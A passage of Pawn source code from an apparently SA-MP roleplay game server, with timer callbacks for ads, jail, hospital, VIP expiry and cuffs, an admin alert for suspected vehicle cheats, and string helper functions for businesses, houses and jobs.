			    RemovePlayerFromVehicle(playerid);
			}
		}
	}
	return 1;
}

forward NOPHacksCheck(playerid);
public NOPHacksCheck(playerid)
{
    new vehicleid = GetPlayerVehicleID(playerid);
    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
    {
        if(IsLeoVehicle(vehicleid) && Player[playerid][pFac] != 1 || IsTruckerVehicle(vehicleid) && Player[playerid][pJob] != JOB_TRUCKER || IsLSFMDVehicle(vehicleid) && Player[playerid][pFac] != 5 || IsFBIVehicle(vehicleid) && Player[playerid][pFac] != 6 || IsDOCVehicle(vehicleid) && Player[playerid][pFac] != 7)
        {
            new string[128];
            format(string, sizeof(string), "AdminWarning: %s(%d) might be Desynced or using NOP hacks. (Driving Restricted Vehicle - Vehicle Model: %d))", GetName(playerid), playerid, GetVehicleModel(vehicleid));
            SendAdminMessage(COLOR_ADMWARN,  string);
            RemovePlayerFromVehicle(playerid);
        }
    }
    return 1;
}


forward ADTimer();
public ADTimer()
{
	if(!LastAd)
	{
		for(new i=0; i<MAX_ADS; i++)
		{
		    if(strlen(AD[i]) > 0 && !LastAd)
			{
			    new string[128];
				SendClientMessageToAll(COLOR_GREEN, AD[i]);
				if(AdQueue > 0) AdQueue --;
		    	LastAd = TIMER_AD;
		    	// LastAds
		    	new File: file = fopen("Log/Players/advertisements.log", io_append);
                if(!dini_Exists("Log/Players/advertisements.log")) dini_Create("Log/Players/advertisements.log");
				format(string, sizeof(string), "%s\r\n", AD[i]);
				fwrite(file, string);
				fclose(file);
		    	// End of LastAds
		    	foreach(Player, p)
		    	{
		    		if(strfind(AD[i], GetName(p)) != -1)
		    		{
		    		    HasAD[p] = 0;
		    		    SendClientMessage(p, COLOR_LIGHTBLUE, " You can now submit another advertisement.");
		    		}
		    	}
		    	format(AD[i], 128, "");
			}
		}
	}
	if(LastAd > 0) LastAd--;
	return 1;
}

forward Clock();
public Clock()
{
    new string[256];
	gettime(thour, tmin, tsec);
	new Day, Month, Year;
	getdate(Year, Month, Day);
	//clock fixes by dean
	new clockfix[4];
	if(tsec < 10) format(clockfix, sizeof(clockfix), "0%d", tsec);
	else if(tsec >= 10) format(clockfix, sizeof(clockfix), "%d", tsec);
	new minfix[4];
	if(tmin < 10) format(minfix, sizeof(minfix), "0%d", tmin);
	else if(tmin >= 10) format(minfix, sizeof(minfix), "%d", tmin);
	new hourfix[4];
	if(thour < 10) format(hourfix, sizeof(hourfix), "0%d", thour);
	else if(thour >= 10) format(hourfix, sizeof(hourfix), "%d", thour);
    new newtext[128];
    format(newtext, sizeof(newtext), "time~w~: %s:%s:%s", hourfix, minfix, clockfix);
    TextDrawSetString(TimeTD, newtext);
	foreach(Player, i)
	{
	    if(Logged(i))
	    {
	        if(!IsAFK[i])
	        {
				Seconds[i] ++;
				if(Seconds[i] == 60)
				{
				    Seconds[i] = 0;
				    Player[i][pMinutes] ++;
				    if(IsValidDynamicObject(Player[i][pWeedObject]) && Player[i][pWeedGrowth] < 45)
	            	{
	            	    Player[i][pWeedGrowth] ++;
	            	}
				    if(Player[i][pVIPTemp])
				    {
				    	Player[i][pVIPTemp] --;
				    	if(Player[i][pVIPTemp] <= 0)
				    	{
				    	    Player[i][pVIP] = 0;
				    	    Player[i][pVIPDay] = 0;
				    	    Player[i][pVIPMonth] = 0;
				    	    Player[i][pVIPHour] = 0;
				    	    Player[i][pVIPTemp] = 0;
							format(string, sizeof(string), "AdminWarning: %s's temporary Bronze VIP package has expired.", GetName(i));
							SendAdminMessage(COLOR_ADMWARN,  string);
							Log("Log/Admins/makevip.log", string);
							SendClientMessage(i, COLOR_LIGHTBLUE, " Your temporary Bronze VIP packag has expired.");
				    	}
					}
				}
				if(Player[i][pVIP])
			    {
			        if(Day >= Player[i][pVIPDay] && Month >= Player[i][pVIPMonth] && !Player[i][pVIPTemp])
			        {
						format(string, sizeof(string), "AdminWarning: %s's %s VIP package has expired.", GetName(i), RPVIPN(i));
						SendAdminMessage(COLOR_ADMWARN,  string);
						Log("Log/Admins/makevip.log", string);
						format(string, sizeof(string), " Your %s VIP package has expired.", RPVIPN(i));
						SendClientMessage(i, COLOR_VIP, string);
						Player[i][pVIP] = 0;
			    	    Player[i][pVIPDay] = 0;
			    	    Player[i][pVIPMonth] = 0;
			    	    Player[i][pVIPHour] = 0;
			    	    Player[i][pVIPTemp] = 0;
			        }
			    }
			}
	    }
	}
	// Paycheck
	if(tmin == 0 && tsec <= 4 && PayChecks == 0)
	{
	    SetWorldTime(thour);
		Paycheck();
		// Points
		for(new idx = 0; idx<MAX_POINTS; idx++)
	    {
	    	PointBC[idx] = 0;
	    }
		for(new idx = 0; idx < MAX_POINTS; idx++)
		{
			if(PointInfo[idx][pTime]) PointInfo[idx][pTime] --;
			if(!PointInfo[idx][pTime] && !PointBC[idx])
			{
			    PointInfo[idx][pOwner] = 0;
			    PointInfo[idx][pProfit] = 0;
			    format(string, sizeof(string), "The {01A9DB}%s {FF6347}is available to be captured.", PointInfo[idx][pName]);
			    SendClientMessageToAll(COLOR_LIGHTRED, string);
			    DestroyDynamicPickup(PointInfo[idx][pPickup]);
			    DestroyDynamic3DTextLabel(PointInfo[idx][pText]);
			    PointInfo[idx][pPickup] = CreateDynamicPickup(1239, 1, PointInfo[idx][pX], PointInfo[idx][pY], PointInfo[idx][pZ]);
		    	PointInfo[idx][pText] = CreateDynamic3DTextLabel("Available Point\nUse {01A9DB}/capture", COLOR_WHITE, PointInfo[idx][pX], PointInfo[idx][pY], PointInfo[idx][pZ]+0.3, 15);

			}
	    }
	}
	return 1;
}

forward EnterExitTimer(playerid);
public EnterExitTimer(playerid)
{
	TogglePlayerControllable(playerid, 1);
	return 1;
}

forward HospitalTimer(playerid);
public HospitalTimer(playerid)
{
	if(Logged(playerid))
	{
		new string[256];
		if(HospitalTime[playerid] > 0)
		{
            format(string, sizeof(string), "Hospital Time: %d", HospitalTime[playerid]);
            TextDrawSetString(HospitalText, string);
            TextDrawShowForPlayer(playerid, HospitalText);
			HospitalTime[playerid] --;
			HospitalCountDown[playerid] = SetTimerEx("HospitalTimer", 1000, false, "d", playerid);
		}
		else if(HospitalTime[playerid] <= 0)
		{
		    SetPlayerPos(playerid, -2667.5903,1381.2924,945.5359);
		    SetPlayerVirtualWorld(playerid, 0);
		    SetPlayerFacingAngle(playerid, 267.4190);
		    SetTimerEx("EnterExitTimer", 5000, false, "i", playerid);
		    Player[playerid][pHospital] = 0;
		    TextDrawHideForPlayer(playerid, HospitalText);
		    SetCameraBehindPlayer(playerid);
		    TogglePlayerControllable(playerid, 1);
		    Player[playerid][pArmor] = 0;
		    SetPlayerHealth(playerid, 40);
		    SetPlayerArmour(playerid, 0);
			KillTimer(HospitalCountDown[playerid]);
			if(Player[playerid][pHealthUpgrade] == 1) return SetPlayerHealth(playerid, 50);
			if(Player[playerid][pHealthUpgrade] == 2) return SetPlayerHealth(playerid, 60);
			if(Player[playerid][pHealthUpgrade] == 3) return SetPlayerHealth(playerid, 70);
			if(Player[playerid][pHealthUpgrade] == 4) return SetPlayerHealth(playerid, 80);
			if(Player[playerid][pArmorUpgrade] == 1) return SetPlayerArmour(playerid, 10);
			if(Player[playerid][pArmorUpgrade] == 2) return SetPlayerArmour(playerid, 20);
			if(Player[playerid][pArmorUpgrade] == 3) return SetPlayerArmour(playerid, 30);
			if(Player[playerid][pArmorUpgrade] == 4) return SetPlayerArmour(playerid, 40);
			if(Player[playerid][pVIP])
			{
				SetPlayerHealth(playerid, 100);
				SendClientMessage(playerid, COLOR_VIP, "VIP Feature: You have spawned with 100 health points.");
			}
			if(Player[playerid][pVIP] >= 2) SendClientMessage(playerid, COLOR_VIP, "VIP Feature: You have recovered quickly from the hospital.");
			if(Player[playerid][pVIP] >= 2)
			{
                SetPlayerArmour(playerid, 50);
                SendClientMessage(playerid, COLOR_VIP, "VIP Feature: You have spawned with 50 armor points.");
            }
			if(Player[playerid][pVIP] == 3)
			{
				if(vPos[playerid][0] == 0)
				{
                   SetPlayerPos(playerid, -2667.5903,1381.2924,945.5359);
		     	   SetPlayerFacingAngle(playerid, 267.4190);
		    	}
                SetPlayerPos(playerid, vPos[playerid][0], vPos[playerid][1], vPos[playerid][2]);
				SetPlayerArmour(playerid, 100);
				SendClientMessage(playerid, COLOR_VIP, "VIP Feature: You have spawned with 100 armor points, and at your spawn point place.");
			}
		}
	}
	return 1;
}

new AutoMSGMessage;
forward AutoMSG();
public AutoMSG()
{
	if(!AutoMSGMessage)
	{
		SendClientMessageToAll(COLOR_ORANGE, "Got any questions related to the script use /newbie.");
		AutoMSGMessage = 1;
	}
	else if(AutoMSGMessage == 1)
	{
		SendClientMessageToAll(COLOR_ORANGE, "Can't find the place you're looking for? /search could help you.");
        AutoMSGMessage = 2;
	}
	else if(AutoMSGMessage == 2)
	{
		SendClientMessageToAll(COLOR_ORANGE, "You can request help from our community helpers using /helpme.");
		AutoMSGMessage = 3;
	}
	else if(AutoMSGMessage == 3)
	{
		SendClientMessageToAll(COLOR_ORANGE, "Don't forget to register on our forums, www.gtairp.com.");
		AutoMSGMessage = 0;
	}
	return 1;
}

forward SprunkTimer(playerid);
public SprunkTimer(playerid)
{
	if(Logged(playerid))
	{
		NoSprunk[playerid] = 0;
	}
	return 1;
}

forward NewbieTimer(playerid);
public NewbieTimer(playerid)
{
	if(Logged(playerid))
	{
		NewbieTime[playerid]--;
		if(NewbieTime[playerid] > 0)
		{
		    SetTimerEx("NewbieTimer", 1000, false, "i", playerid);
		}
	}
	return 1;
}

forward ReportTimer(playerid);
public ReportTimer(playerid)
{
	if(Logged(playerid))
	{
		ReportTime[playerid]--;
		if(ReportTime[playerid] > 0)
		{
		    SetTimerEx("ReportTimer", 1000, false, "i", playerid);
		}
	}
	return 1;
}

forward HelpTimer(playerid);
public HelpTimer(playerid)
{
	if(Logged(playerid))
	{
		HelpTime[playerid]--;
		if(HelpTime[playerid] > 0)
		{
		    SetTimerEx("HelpTimer", 1000, false, "i", playerid);
		}
	}
	return 1;
}

forward TazeTimer(playerid);
public TazeTimer(playerid)
{
    if(Logged(playerid))
	{
	    new string[128];
		if (TazeTimeout[playerid] > 0)
	   	{
	   		format(string,sizeof(string),"~n~~n~~n~~n~~n~~n~~n~~n~~r~Tazer effect fading in ~w~%d ~r~seconds", TazeTimeout[playerid]);
			GameTextForPlayer(playerid, string,1500, 3);
			TazeTimeout[playerid] -= 1;
			ApplyAnimation(playerid,"crack","crckdeth2",4.1,0,1,1,1,1,1);
	   	}
	   	if(TazeTimeout[playerid] <= 0)
	   	{
	   	    KillTimer(TazeCountDown[playerid]);
	   	    TogglePlayerControllable(playerid, 1);
	   	    TogglePlayerTazed(playerid, 0);
	   	}
   	}
	return 1;
}

forward CuffTimer(playerid);
public CuffTimer(playerid)
{
    if(Logged(playerid))
	{
	    new string[128];
		if (CuffTimeout[playerid] > 0)
	   	{
	   		//format(string,sizeof(string),"~n~~n~~n~~n~~n~~n~~n~~n~~r~Cuffs open in ~w~%d ~r~seconds", CuffTimeout[playerid]);
			//GameTextForPlayer(playerid, string,1500, 3);
			CuffTimeout[playerid] -= 1;
	   	}
	   	if(CuffTimeout[playerid] <= 0)
	   	{
	   	    KillTimer(CuffCountDown[playerid]);
	   	    TogglePlayerControllable(playerid, 1);
	   	    TogglePlayerCuffed(playerid, 0);
	   	    TogglePlayerTazed(playerid, 0);
	   	    if(!Uncuffed[playerid])
	   	    {
		   	    format(string, sizeof(string), "* %s manages to get their hands out of the cuffs.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			}
			Uncuffed[playerid] = 0;
			KillTimer(CuffCountDown[playerid]);
			RemovePlayerAttachedObject(playerid, 0);
			ClearAnimations(playerid);
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
	   	}
   	}
	return 1;
}

forward PhoneCall(playerid);
public PhoneCall(playerid)
{
    if(Logged(playerid))
	{
		new string[128];
		if(Calling[playerid])
		{
		    CallTime[playerid] ++;
		    format(string,sizeof(string),"~n~~n~~n~~n~~n~~n~~n~~n~~r~Call timer: ~w~%d ~r~seconds", CallTime[playerid]);
			GameTextForPlayer(playerid, string,1500, 3);
		    SetTimerEx("PhoneCall", 1000, false, "d", playerid);
		}
	}
	return 1;
}

forward JailTimer();
public JailTimer()
{
	foreach(Player, playerid)
	{
		new string[128];
	    if(Player[playerid][pJailTime] <=0)
	    {
	        if(Player[playerid][pJail] == 1) // LSPD Jail
			{
			    Player[playerid][pJail] = 0;
				Player[playerid][pJailTime] = 0;
				SetPlayerInterior(playerid, 0);
				SetPlayerFacingAngle(playerid, 87.1763);
				SetPlayerColor(playerid, TRANSPARENT_WHITE);
				SetPlayerPos(playerid, 1546.1428,-1675.4786,13.5617);
				SetCameraBehindPlayer(playerid);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have served your jail time, try to be a better citizen.");
				format(string, sizeof(string), "Department Center: %s has been released as they served their jail time.", GetName(playerid));
				foreach(Player, i)
				{
				    if(IsACop(i) && IsFBI(i))
				    {
				        SendClientMessage(i, COLOR_BLUE, string);
				    }
				}
			}
	        else if(Player[playerid][pJail] == 2) // Admin Jail
			{
			    Player[playerid][pJail] = 0;
				Player[playerid][pJailTime] = 0;
				format(Player[playerid][pJailReason], 64, "");
				format(Player[playerid][pJailBy], 32, "");
				SetPlayerInterior(playerid, 0);
				SetPlayerVirtualWorld(playerid, 0);
				SetPlayerFacingAngle(playerid, 87.1763);
				SetPlayerColor(playerid, TRANSPARENT_WHITE);
				SetPlayerPos(playerid, 1546.1428,-1675.4786,13.5617);
				SetCameraBehindPlayer(playerid);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have served your jail time, try to be a better player.");
			}
	    }
	    else
        {
			if(!IsAFK[playerid])
			{
        	   	Player[playerid][pJailTime] --;
	         	format(string,sizeof(string),"~n~~n~~n~~n~~n~~n~~n~~n~~r~Jail Time Left: ~w~%d ~r~seconds", Player[playerid][pJailTime]);
		     	GameTextForPlayer(playerid, string,1500, 3);
            }
		}
	}
	return 1;
}
forward PrisonTimer();
public PrisonTimer()
{
	foreach(Player, playerid)
	{
		new string[128];
	    if(Player[playerid][pPrisonTime] <=0)
	    {
	        if(Player[playerid][pPrison] == 1) // NG Prison
			{
			    Player[playerid][pPrison] = 0;
				Player[playerid][pPrisonTime] = 0;
				SetPlayerInterior(playerid, 0);
				SetPlayerFacingAngle(playerid, 87.1763);
				SetPlayerColor(playerid, TRANSPARENT_WHITE);
				SetPlayerPos(playerid, 1546.1428,-1675.4786,13.5617);
				SetCameraBehindPlayer(playerid);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have served your prison time, try to be a better citizen.");
				format(string, sizeof(string), "Prison: %s has been released as they served their prison time.", GetName(playerid));
				foreach(Player, i)
				{
				    if(IsACop(i) && IsFBI(i) && IsDOC(i))
				    {
				        SendClientMessage(i, COLOR_BLUE, string);
				    }
				}
			}
	        else if(Player[playerid][pPrison] == 2) // Admin Prison
			{
			    Player[playerid][pPrison] = 0;
				Player[playerid][pPrisonTime] = 0;
				format(Player[playerid][pPrisonReason], 64, "");
				format(Player[playerid][pPrisonBy], 32, "");
				SetPlayerInterior(playerid, 0);
				SetPlayerVirtualWorld(playerid, 0);
				SetPlayerFacingAngle(playerid, 87.1763);
				SetPlayerColor(playerid, TRANSPARENT_WHITE);
				SetPlayerPos(playerid, 1546.1428,-1675.4786,13.5617);
				SetCameraBehindPlayer(playerid);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have served your prison time, try to be a better player.");
			}
	    }
	    else
	    {
            if(!IsAFK[playerid])
            {
        	   	Player[playerid][pPrisonTime] --;
	          	format(string,sizeof(string),"~n~~n~~n~~n~~n~~n~~n~~n~~r~Prison Time Left: ~w~%d ~r~seconds", Player[playerid][pPrisonTime]);
	     		GameTextForPlayer(playerid, string,1500, 3);
	     	}
		}
	}
	return 1;
}

// Stocks
stock GetAccountName(playerid)
{
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, name, sizeof(name));
	return name;
}

stock GetName(playerid)
{
    new name[MAX_PLAYER_NAME];
    GetPlayerName(playerid,name,sizeof(name));
   	/*for(new i = 0; i < MAX_PLAYER_NAME; i++)
    {
        if(name[i] == '_') name[i] = ' ';
    }*/
    return name;
}

stock IsGovVehicle(vehicleid)
{
	for(new i=0; i<2; i++)
	{
	    if(vehicleid == FacInfo[2][fCars][i]) return 1;
	}
	return 0;
}
stock IsDMVCar(vehicleid)
{
    for(new i=0; i<5; i++)
    {
        if(vehicleid == DMVCar[i]) return 1;
    }
    return 0;
}
stock IsVIPCar(vehicleid)
{
    for(new i=0; i<29; i++)
    {
        if(vehicleid == VIPCar[i]) return 1;
    }
    return 0;
}
stock IsNewsVehicle(vehicleid)
{
	for(new i=0; i<8; i++)
	{
	    if(vehicleid == FacInfo[4][fCars][i]) return 1;
	}
	return 0;
}

stock IsLeoVehicle(vehicleid)
{
	for(new i=0; i<50; i++)
	{
	    if(vehicleid == FacInfo[1][fCars][i]) return 1;
	}
	return 0;
}
stock IsLSFMDVehicle(vehicleid)
{
	for(new i=0; i<26; i++)
	{
	    if(vehicleid == FacInfo[5][fCars][i]) return 1;
	}
	return 0;
}
stock IsAPlane(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
		case 563,548,497,488,487,447,417,460,464,476,511,512,513,519,520,553,577,592,593: return 1;
	}
	return 0;
}
stock IsABike(vehicleid)
{
	switch(GetVehicleModel(vehicleid))
	{
		case 481,509,510: return 1;
	}
	return 0;
}
stock IsFBIVehicle(vehicleid)
{
	for(new i=0; i<15; i++)
	{
	    if(vehicleid == FacInfo[6][fCars][i]) return 1;
	}
	return 0;
}
stock IsDOCVehicle(vehicleid)
{
	for(new i=0; i<15; i++)
	{
	    if(vehicleid == FacInfo[7][fCars][i]) return 1;
	}
	return 0;
}
stock IsFamVehicle(vehicleid)
{
	for(new idx=1; idx<MAX_FAMILIES; idx++)
	{
	    for(new v=0; v<5; v++)
	    {
			if(vehicleid == FamInfo[idx][fVeh][v]) return 1;
		}
	}
	return 0;
}

stock GFVS(vehicleid)
{
	new slot;
	for(new idx=1; idx<MAX_FAMILIES; idx++)
	{
	    for(new v=0; v<5; v++)
	    {
			if(vehicleid == FamInfo[idx][fVeh][v]) {slot = v;}
		}
	}
	return slot;
}

stock RVF(vehicleid)
{
	new fam;

	return fam;
}

stock IsTruckerVehicle(vehicleid)
{
	for(new i=0; i<10; i++)
	{
	    if(vehicleid == JobInfo[JOB_TRUCKER][jCars][i]) return 1;
	}
	return 0;
}




//Animations Defines

stock LoopingAnim(playerid,animlib[],animname[], Float:Speed, looping, lockx, locky, lockz, lp)
{
	if (gPlayerUsingLoopingAnim[playerid] == 1) TextDrawHideForPlayer(playerid,txtAnimHelper);
	gPlayerUsingLoopingAnim[playerid] = 1;
	ApplyAnimation(playerid, animlib, animname, Speed, looping, lockx, locky, lockz, lp);
	TextDrawShowForPlayer(playerid,txtAnimHelper);
	animation[playerid]++;
}

stock OnePlayAnim(playerid,animlib[],animname[], Float:Speed, looping, lockx, locky, lockz, lp)
{
	if (gPlayerUsingLoopingAnim[playerid] == 1) TextDrawHideForPlayer(playerid,txtAnimHelper);
	ApplyAnimation(playerid, animlib, animname, Speed, looping, lockx, locky, lockz, lp);
	animation[playerid]++;
}

stock StopLoopingAnim(playerid)
{
	gPlayerUsingLoopingAnim[playerid] = 0;
	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0);
}

stock PreloadAnimLib(playerid, animlib[])
{
	ApplyAnimation(playerid,animlib,"null",0.0,0,0,0,0,0);
}

// End of animations defines

stock IsKeyJustDown(key, newkeys, oldkeys)
{
	if((newkeys & key) && !(oldkeys & key)) return 1;
	return 0;
}

stock RBT(bizid)
{
	new string[24];
	if(!BizInfo[bizid][bType]) format(string, sizeof(string), "None");
    else if(BizInfo[bizid][bType] == 1) format(string, sizeof(string), "Market");
    else if(BizInfo[bizid][bType] == 2) format(string, sizeof(string), "Clothes Shop");
    else if(BizInfo[bizid][bType] == 3) format(string, sizeof(string), "Ammunation");
    else if(BizInfo[bizid][bType] == 4) format(string, sizeof(string), "Club");
    else if(BizInfo[bizid][bType] == 5) format(string, sizeof(string), "Advertisement Agency");
    else if(BizInfo[bizid][bType] == 6) format(string, sizeof(string), "Fast Food");
	return string;
}

stock RHS(bizid)
{
	new string[16];
	if(!HouseInfo[bizid][hStatus]) format(string, sizeof(string), "Closed");
    else if(HouseInfo[bizid][hStatus]) format(string, sizeof(string), "Open");
	return string;
}

stock RBS(bizid)
{
	new string[16];
	if(!BizInfo[bizid][bStatus]) format(string, sizeof(string), "Closed");
    else if(BizInfo[bizid][bStatus]) format(string, sizeof(string), "Open");
	return string;
}

stock RPBP(playerid)
{
	new string[32];
	if(!Player[playerid][pBiz]) format(string, sizeof(string), "None");
	else if(Player[playerid][pBiz]) format(string, sizeof(string), "%d", BizInfo[Player[playerid][pBiz]][bProducts]);
	return string;
}

stock RPVIPBP(playerid)
{
	new string[32];
	if(!Player[playerid][pVBiz]) format(string, sizeof(string), "None");
	else if(Player[playerid][pVBiz]) format(string, sizeof(string), "%d", BizInfo[Player[playerid][pVBiz]][bProducts]);
	return string;
}

stock RPPNO(playerid)
{
	new string[32];
	if(!Player[playerid][pPhone]) format(string, sizeof(string), "None");
	else if(Player[playerid][pPhone]) format(string, sizeof(string), "%d", Player[playerid][pPhone]);
	return string;
}

stock RPBM(playerid)
{
	new string[32];
	if(!Player[playerid][pBiz]) format(string, sizeof(string), "None");
	else if(Player[playerid][pBiz]) format(string, sizeof(string), "$%d", BizInfo[Player[playerid][pBiz]][bMoney]);
	return string;
}
stock RPBK(playerid)
{
	new string[8];
	if(!Player[playerid][pBiz]) format(string, sizeof(string), "0");
	else if(Player[playerid][pBiz]) format(string, sizeof(string), "%d", Player[playerid][pBiz]);
	return string;
}

stock RPBS(playerid)
{
	new idx = Player[playerid][pBiz];
	return BizInfo[idx][bSold];
}

stock RPBL(playerid)
{
	new string[32], idx = Player[playerid][pBiz];
	if(!Player[playerid][pBiz]) format(string, sizeof(string), "None");
	else if(Player[playerid][pBiz]) format(string, sizeof(string), "%d", BizInfo[idx][bLevel]);
	return string;
}

// VIP
stock RPVIPBM(playerid)
{
	new string[32];
	if(!Player[playerid][pVBiz]) format(string, sizeof(string), "None");
	else if(Player[playerid][pVBiz]) format(string, sizeof(string), "$%d", BizInfo[Player[playerid][pVBiz]][bMoney]);
	return string;
}
stock RPVIPBK(playerid)
{
	new string[8];
	if(!Player[playerid][pVBiz]) format(string, sizeof(string), "0");
	else if(Player[playerid][pVBiz]) format(string, sizeof(string), "%d", Player[playerid][pVBiz]);
	return string;
}

stock RPVIPBS(playerid)
{
	new idx = Player[playerid][pVBiz];
	return BizInfo[idx][bSold];
}

stock RPVIPBL(playerid)
{
	new string[32], idx = Player[playerid][pVBiz];
	if(!Player[playerid][pVBiz]) format(string, sizeof(string), "None");
	else if(Player[playerid][pVBiz]) format(string, sizeof(string), "%d", BizInfo[idx][bLevel]);
	return string;
}
//

stock RPHL(playerid)
{
	new string[32], idx = Player[playerid][pHouse];
	if(!Player[playerid][pHouse]) format(string, sizeof(string), "None");
	else if(Player[playerid][pHouse]) format(string, sizeof(string), "%d", HouseInfo[idx][hLevel]);
	return string;
}

stock RPVIPHL(playerid)
{
	new string[32], idx = Player[playerid][pVHouse];
	if(!Player[playerid][pVHouse]) format(string, sizeof(string), "0");
	else if(Player[playerid][pVHouse]) format(string, sizeof(string), "%d", HouseInfo[idx][hLevel]);
	return string;
}

stock RPHK(playerid)
{
	new string[8];
	if(!Player[playerid][pHouse]) format(string, sizeof(string), "0");
	else if(Player[playerid][pHouse]) format(string, sizeof(string), "%d", Player[playerid][pHouse]);
	return string;
}
stock RPGK(playerid)
{
	new string[8];
	if(!Player[playerid][pGarage]) format(string, sizeof(string), "0");
	else if(Player[playerid][pGarage]) format(string, sizeof(string), "%d", Player[playerid][pGarage]);
	return string;
}

stock RPVIPGK(playerid)
{
	new string[8];
	if(!Player[playerid][pVGarage]) format(string, sizeof(string), "0");
	else if(Player[playerid][pVGarage]) format(string, sizeof(string), "%d", Player[playerid][pVGarage]);
	return string;
}
stock RPVIPHK(playerid)
{
	new string[8];
	if(!Player[playerid][pVHouse]) format(string, sizeof(string), "0");
	else if(Player[playerid][pVHouse]) format(string, sizeof(string), "%d", Player[playerid][pVHouse]);
	return string;
}

stock RPJN(playerid)
{
	new string[32];
	if(Player[playerid][pJob] == JOB_NONE) format(string, sizeof(string), "None");
	else if(Player[playerid][pJob] == JOB_MECHANIC) format(string, sizeof(string), "Mechanic");
	else if(Player[playerid][pJob] == JOB_LAWYER) format(string, sizeof(string), "Lawyer");
	else if(Player[playerid][pJob] == JOB_TRUCKER) format(string, sizeof(string), "Trucker");
	else if(Player[playerid][pJob] == JOB_WDEALER) format(string, sizeof(string), "Weapons Dealer");
	else if(Player[playerid][pJob] == JOB_WSMUGGLER) format(string, sizeof(string), "Weapons Smuggler");
	else if(Player[playerid][pJob] == JOB_DDEALER) format(string, sizeof(string), "Drugs Dealer");
	else if(Player[playerid][pJob] == JOB_DSMUGGLER) format(string, sizeof(string), "Drugs Smuggler");
	else if(Player[playerid][pJob] == JOB_BODYGUARD) format(string, sizeof(string), "Bodyguard");
	return string;
}

stock RPVJN(playerid)
{
	new string[32];
	if(Player[playerid][pVIPJob] == JOB_NONE) format(string, sizeof(string), "None");
	else if(Player[playerid][pVIPJob] == JOB_MECHANIC) format(string, sizeof(string), "Mechanic");
	else if(Player[playerid][pVIPJob] == JOB_LAWYER) format(string, sizeof(string), "Lawyer");
	else if(Player[playerid][pVIPJob] == JOB_TRUCKER) format(string, sizeof(string), "Trucker");
	else if(Player[playerid][pVIPJob] == JOB_WDEALER) format(string, sizeof(string), "Weapons Dealer");
	else if(Player[playerid][pVIPJob] == JOB_WSMUGGLER) format(string, sizeof(string), "Weapons Smuggler");
	else if(Player[playerid][pVIPJob] == JOB_DDEALER) format(string, sizeof(string), "Drugs Dealer");
	else if(Player[playerid][pVIPJob] == JOB_DSMUGGLER) format(string, sizeof(string), "Drugs Smuggler");
	else if(Player[playerid][pVIPJob] == JOB_BODYGUARD) format(string, sizeof(string), "Bodyguard");
	return string;
}

stock RPJL(playerid, skillid)
{
    // Legal Jobs: 1) Mechanic | 2) Lawyer | 3) Trucker | 4) Fisher
	// Illegal Jobs: 5) Weapons Dealer | 6) Weapons Smuggler | 7) Drugs Dealer | 8) Drugs Smuggler | 9) Car Jacker
	// L1: 0 | L2: 100 | L3: 300 | L4: 700 | L5: 1200
	new string[4], skill, level;
	skill = Player[playerid][pJobSkill][skillid];
	if(skill < 100) level = 1;
	else if(skill < 300) level = 2;
	else if(skill < 700) level = 3;
	else if(skill < 1200) level = 4;
	else if(skill >= 1200) level = 5;
	format(string, sizeof(string), "%d", level);
	return string;
}

stock RPJS(playerid, jobid)
{
	return Player[playerid][pJobSkill][jobid];
}



stock GetVehicleSpeed(vehicleid, get3d)
{
	new Float:x, Float:y, Float:z;
	GetVehicleVelocity(vehicleid, x, y, z);
	return SpeedCheck(x, y, z, 100.0, get3d);
}

stock AddZamoraWantedLevel(playerid, crime[])
{
	Player[playerid][pCrimes] ++;
	Player[playerid][pWanted] ++;
    SetPlayerWantedLevel(playerid, GetPlayerWantedLevel(playerid)+1);
    if(Player[playerid][pWanted] == 1) format(Player[playerid][pWanted1], 64, "%s", crime);
    if(Player[playerid][pWanted] == 2) format(Player[playerid][pWanted2], 64, "%s", crime);
    if(Player[playerid][pWanted] == 3) format(Player[playerid][pWanted3], 64, "%s", crime);
    if(Player[playerid][pWanted] == 4) format(Player[playerid][pWanted4], 64, "%s", crime);
    if(Player[playerid][pWanted] == 5) format(Player[playerid][pWanted5], 64, "%s", crime);
    if(Player[playerid][pWanted] == 6) format(Player[playerid][pWanted6], 64, "%s", crime);
	return 1;
}

stock ClearZamoraWantedLevels(playerid)
{
    Player[playerid][pWanted] = 0;
    SetPlayerWantedLevel(playerid, 0);
    format(Player[playerid][pWanted1], 64, "");
    format(Player[playerid][pWanted2], 64, "");
    format(Player[playerid][pWanted3], 64, "");
    format(Player[playerid][pWanted4], 64, "");
    format(Player[playerid][pWanted5], 64, "");
    format(Player[playerid][pWanted6], 64, "");
	return 1;
}

stock IsPlayerNearBankBooth(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 2, 2226.0002,2090.1841,100.3772)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2226.0930,2087.5996,100.3772)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2226.3230,2075.5664,100.3772)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2246.7964,2081.2954,100.3772)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2247.2007,2087.5403,100.3772)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2226.2703,2081.1624,100.3772)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2247.1851,2090.2986,100.3772)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2247.0850,2084.6787,100.3772)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2225.8933,2078.4456,100.3772)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2225.9014,2084.6091,100.3772)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2247.5032,2078.4670,100.3772)) return 1;
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2247.6833,2075.4761,100.3772)) return 1;
	return 0;
}

